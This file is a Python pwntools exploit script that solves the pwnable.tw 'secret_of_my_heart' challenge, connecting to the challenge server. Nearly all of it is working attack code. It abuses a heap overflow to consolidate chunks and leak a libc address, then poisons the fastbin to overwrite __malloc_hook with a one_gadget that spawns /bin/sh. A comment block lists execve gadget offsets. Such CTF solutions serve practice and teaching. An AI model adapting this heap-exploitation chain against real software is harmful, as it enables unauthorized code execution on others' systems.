from pwn import *

context.log_level = 'debug'
prog = './secret_of_my_heart'
elf = ELF(prog)
#p = process(prog)
p = remote("chall.pwnable.tw", 10302)
libc = ELF("libc_64.so.6")
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()

def add(size, content='a'):
	p.sendlineafter("choice :", '1')
	p.sendlineafter("Size of heart : ", str(size))
	p.sendafter("heart :", 'a'*0x20)
	p.sendafter("secret of my heart :", content)
def show(idx):
	p.sendlineafter("choice :", '2')
	p.sendlineafter("Index :", str(idx))
def free(idx):
	p.sendlineafter("choice :", '3')
	p.sendlineafter("Index :", str(idx))

def exp():
	add(0x80)#0
	add(0x68)#1
	add(0xf0)#2
	add(0x68)#3
	free(1)
	free(0)
	add(0x68, 'a'*0x60+p64(0x100))#0
	free(2)
	add(0x80)#1
	show(0)
	p.recvuntil("Secret : ")
	libc.address = u64(p.recv(6)+'\x00'*2)-0x00007f19b8d70b78+0x7f19b89ac000+0x1000
	log.info("libc.address ==> " + hex(libc.address))
	add(0x68)#2
	free(2)
	free(3)
	free(0)
	add(0x68, p64(libc.sym['__malloc_hook']-0x23))#0
	add(0x68)#2
	add(0x68)#3
	add(0x68, '\x00'*0x13+p64(libc.address+0xef6c4))
	free(0)
	free(3)
	p.interactive()
	#dbg()
if __name__ == '__main__':
	exp()


'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

#log.info("libc.address ==> " + hex(libc.address))
'''